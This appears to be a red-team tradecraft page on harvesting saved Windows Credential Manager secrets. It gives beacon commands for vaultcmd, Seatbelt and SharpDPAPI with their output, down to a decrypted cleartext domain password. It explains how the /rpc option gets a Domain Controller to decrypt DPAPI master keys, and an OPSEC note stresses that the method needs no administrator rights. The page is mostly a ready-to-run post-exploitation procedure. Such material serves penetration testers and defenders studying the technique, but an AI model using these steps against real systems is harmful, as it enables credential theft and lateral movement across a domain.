---
title: "Windows Credential Manager Harvesting"
date: 2026-09-25
weight: 3
type: docs
tags:
  - Active Directory
  - Credential Access
---

The Windows Credential Manager acts as a centralized storage vault where users can delegate the OS to preserve authentication data, such as tokens for network shares or Remote Desktop Protocol (RDP) sessions. Operators can access and decrypt these stored repositories to expose cleartext credentials and pivot across the domain tier [[T1555.004](https://attack.mitre.org/techniques/T1555/004/)].

This section details methods to discover saved vaults and retrieve the cleartext strings contained within them.

## Identifying Stored Vault Records

To evaluate if an active session contains high-value connection targets, operators first inventory the system's saved credential objects. The native binary `vaultcmd` provides a direct way to safely list these elements from the command line.

```bash
beacon> run vaultcmd /listcreds:"Windows Credentials" /all

Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/10.10.10.10
Identity: local_admin
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

The post-exploitation situational awareness tool Seatbelt can similarly enumerate these objects using its dedicated `WindowsVault` command block.

```powershell
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

====== WindowsVault ======

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 1
      SchemaGuid   : 3e0e35be-1b77-43e7-b873-aed901b6275b
      Resource     : String: Domain:target=TERMSRV/wkstn-1.arcadia.local
      Identity     : String: ARCADIA\local_admin
      PackageSid   : (null)
      Credential   : 
      LastModified : 14/02/2025 14:02:28
```

## Automated DPAPI Vault Decryption

The underlying encryption scheme protecting these credential blobs relies on a nested architecture. Individual targets are encrypted via unique, randomly generated symmetric AES keys. These symmetric keys are subsequently encrypted using the targeted user's master Data Protection API (DPAPI) key. To perform manual recovery, an operator must isolate the corresponding master key GUID, resolve it through DPAPI routines, and then unpack the initial data container.

The tool SharpDPAPI streamlines this entire workflow by programmatic traversal and automatic parsing.

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc

Folder       : C:\Users\operator.user\AppData\Local\Microsoft\Credentials\

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data
    LastWritten      : 14/02/2025 14:02:28
    TargetName       : Domain:target=TERMSRV/wkstn-1.arcadia.local
    TargetAlias      :
    Comment          :
    UserName         : ARCADIA\local_admin
    Credential       : ArcadiaPass2026!
```

The tool's `credentials` module targets and evaluates saved blobs belonging to the context of the active user session. By default, it queries local cache files for previously unlocked keys. If no keys are cached locally, appending the `/rpc` parameter instructs the tool to initiate communication via the Microsoft BackupKey Remote Protocol (MS-BKRP). This protocol allows the endpoint to prompt a Domain Controller to decrypt the master key envelope on the user's behalf, leveraging the backup keys maintained by Active Directory for recovery scenarios.

* **OPSEC Note:** Unlike LSASS memory exploitation or SAM database interaction, this harvesting method does not require elevated administrative privileges and can be safely executed from a standard **medium-integrity context**.
